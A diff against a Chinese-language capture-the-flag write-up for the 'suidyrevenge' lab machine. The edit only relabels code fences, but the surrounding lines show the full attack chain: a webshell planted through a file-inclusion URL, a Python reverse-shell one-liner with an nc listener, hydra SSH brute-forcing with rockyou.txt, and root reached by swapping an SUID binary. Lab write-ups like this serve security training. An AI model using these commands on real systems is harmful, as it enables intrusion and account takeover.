@@ -108,7 +108,7 @@ http://192.168.56.109/supersecure/mysuperbackdoor.php?file=data:text/plain,<?php
 
 成功实现 webshell 部署，进而反弹 shell
 
-```shell
+```bash
 ┌─[✗]─[randark@parrot]─[~/tmp]
 └──╼ $nc -lvnp 9999
 listening on [any] 9999 ...
@@ -119,7 +119,7 @@ www-data
 
 提升 pty
 
-```shell
+```bash
 # python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 8888
@@ -144,7 +144,7 @@ one password from rockyou.txt !
 
 ## SSH 爆破 - murda
 
-```shell
+```bash
 ┌─[✗]─[randark@parrot]─[~/tmp]
 └──╼ $hydra -v -V -I -l murda -P /usr/share/wordlists/rockyou.txt 192.168.56.109 ssh -t 4
 ......
@@ -153,7 +153,7 @@ one password from rockyou.txt !
 
 ## User - murda
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs murda@192.168.56.109
 [14:37:23] Welcome to pwncat 🐈!
@@ -177,7 +177,7 @@ Remember that rockyou.txt is your friend!
 
 ### 探测现有用户
 
-```shell
+```bash
 (remote) murda@suidyrevenge:/home$ ls -lh
 total 32K
 drwxrwxr--  3 murda   murda   4.0K Oct  1  2020 murda
@@ -198,7 +198,7 @@ theuser:different
 
 尝试登陆
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs theuser@192.168.56.109
 [14:51:47] Welcome to pwncat 🐈!
@@ -212,7 +212,7 @@ theuser
 
 ### flag - user
 
-```shell
+```bash
 (remote) theuser@suidyrevenge:/home/theuser$ cat user.txt
 
                                    .     **
@@ -245,7 +245,7 @@ HMVbisoususeryay
 
 根据探测，`suidy` 用户的用户目录可以访问
 
-```shell
+```bash
 (remote) theuser@suidyrevenge:/home/suidy$ ls -lah
 total 52K
 drwxrwxr-x 3 suidy suidy   4.0K Oct  2  2020 .
@@ -261,7 +261,7 @@ drwxr-xr-x 3 suidy suidy   4.0K Oct  1  2020 .local
 
 其中，`suidyyyyy` 具有 suid，并且当前用户具有执行的权限，直接执行即可横向
 
-```shell
+```bash
 (remote) theuser@suidyrevenge:/home/suidy$ ./suidyyyyy
 suidy@suidyrevenge:/home/suidy$ whoami
 suidy
@@ -296,7 +296,7 @@ int main(){
 
 编译后执行替换
 
-```shell
+```bash
 (remote) theuser@suidyrevenge:/home/theuser$ nano suid.c
 (remote) theuser@suidyrevenge:/home/theuser$ gcc suid.c -o suid
 (remote) theuser@suidyrevenge:/home/theuser$ cp ./suid /home/suidy/suidyyyyy
@@ -314,7 +314,7 @@ root
 
 ### flag- root
 
-```shell
+```bash
 root@suidyrevenge:/root# cat root.txt
 
                                    .     **
